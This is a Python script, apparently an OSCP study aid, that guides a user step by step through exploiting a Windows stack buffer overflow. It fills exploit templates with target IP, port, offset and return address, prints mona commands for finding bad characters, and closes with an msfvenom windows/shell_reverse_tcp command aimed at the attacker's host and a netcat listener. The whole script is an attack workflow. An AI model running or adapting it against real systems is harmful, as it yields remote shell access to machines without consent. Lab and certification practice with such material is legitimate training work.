#!/usr/bin/env python3

import os

def insert_content(filename, content):
    with open(filename, "r") as f:
        contents = f.readlines()

    contents.insert(3, content + "\n")

    with open(filename, "w") as f:
        contents = "".join(contents)
        f.write(contents)



os.system('figlet -k "Bianfusia\nOSCP\nBOF Guide"')

breaklines = "#" * 15
path = "./templates/"

rhost = input("Please enter target IP address: ")
rport = input("Please enter target port: ")
lhost = input("Please enter your IP address: ")
lport = input("Please enter your preferred port: ")

print(breaklines)
print("Step 1: configure mona in immunity debugger\n!mona config -set workingfolder c:\mona\%p")
input("Press any key to continue")

os.system("cp " + path + "bof1.py ./bof1.py")
insert_content("bof1.py","port = " + rport)
insert_content("bof1.py",'ip = "' + rhost + '"')
print("Step 2: Run bof1.py")
print("python3 bof1.py")
crash_byte = input("What is the largest number of bytes? ")
crashplus_byte = int(crash_byte) + 400
print("Step 3: give me the output of this command:\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + str(crashplus_byte))
cylic_pattern = input("output please: ")
os.system("cp " + path + "bof2.py ./bof2.py")
insert_content("bof2.py","port = " + rport)
insert_content("bof2.py",'ip = "' + rhost + '"')
insert_content("bof2.py",'payload = "' + cylic_pattern + '"')
print("Step 4: Run bof2.py")
print("python3 bof2.py")
input("Press any key to continue")
print("Step 5: find the offset value with:\n!mona findmsp -distance " + str(crashplus_byte))
print("find text: 'EIP contains normal pattern : ... (offset XXXX)'")
offset_value = input("What is the offset value?: ")
os.system("cp " + path + "bof3.py ./bof3.py")
insert_content("bof3.py","port = " + rport)
insert_content("bof3.py",'ip = "' + rhost + '"')
insert_content("bof3.py",'payload = "' + cylic_pattern + '"')
insert_content("bof3.py","offset = " + offset_value)
print("Step 6: Run bof3.py to verify offset value")
print("python3 bof3.py")
input("You should see EIP with 424242. Press any key to continue...")
# CREATE LOOP HERE MAYBE
bad_char = "\\x00"
listRem = ""
while True:
    print('Step 7: time to remove bad characters!\n!mona bytearray -b "' + bad_char +'"')
    input('Let me know when you are done...')
    os.system("cp " + path + "char_gen.py ./char_gen.py")
    insert_content("char_gen.py",'listRem = "' + listRem + '"')
    print("Step 8: Run char_gen.py to test for more bad characters")
    print("python3 char_gen.py")
    cylic_pattern = input("output please: ")
    os.system("cp " + path + "bof3.py ./bof3.py")
    insert_content("bof3.py","port = " + rport)
    insert_content("bof3.py",'ip = "' + rhost + '"')
    insert_content("bof3.py",'payload = "' + cylic_pattern + '"')
    insert_content("bof3.py","offset = " + offset_value)
    print("Step 9: Run bof3.py again with new payload to ensure no more bad char.")
    print("python3 bof3.py")
    esp_value = input("What is the ESP value?: ")
    print("Step 10: Run mona command to check for bad char\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a " + esp_value)
    more_char = input("more bad bytes?: ")
    if more_char == "":
        break
    else:
        two_char = input("double slash it for me: ")
        bad_char = bad_char + more_char
        listRem = listRem + two_char
        print("its rewind time!")

print("Congratulation you escaped Hell!")
print('Step 11: run this mona command and give me an address\n!mona jmp -r esp -cpb "' + bad_char + '"')
false_addr = input('Give me the address please: ')
os.system("cp " + path + "bof4.py ./bof4.py")
insert_content("bof4.py","port = " + rport)
insert_content("bof4.py",'ip = "' + rhost + '"')
insert_content("bof4.py","offset = " + offset_value)
insert_content("bof4.py",'retn = "' + false_addr + '"')
print("Now run this command to generate a reverse payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -b '" + bad_char + "' EXITFUNC=thread -f python -v payload")
print("paste the payload with 'b' into bof4.py and run it. remember to setup nc listener. Thank you for using bianfusia product.")
        
